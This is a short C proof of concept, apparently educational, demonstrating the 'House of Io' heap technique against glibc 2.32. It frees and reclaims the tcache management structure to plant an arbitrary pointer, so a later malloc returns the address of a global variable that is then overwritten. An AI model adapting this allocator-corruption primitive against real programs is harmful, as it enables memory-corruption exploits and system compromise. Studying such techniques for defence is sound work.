/* House of Io for Malloc in Glibc 2.32 - safe-linking bypass */
#include <stdio.h>
#include <stdlib.h>

unsigned long victim = 1;

int main()
{
        long int *a, *b, *c;


        a = malloc(20);
        b = malloc(20);
        free(b);
 
        a = *(b + 1);

        free(a);

        c = malloc(0x285);

        *c = 2;
        long int *z = (char *)c + 0x80;

        *z = &victim; 

        int *v;

        v = malloc(0x15);


        *v = 2; 
        printf("%d\n", victim);

        return 0;
}
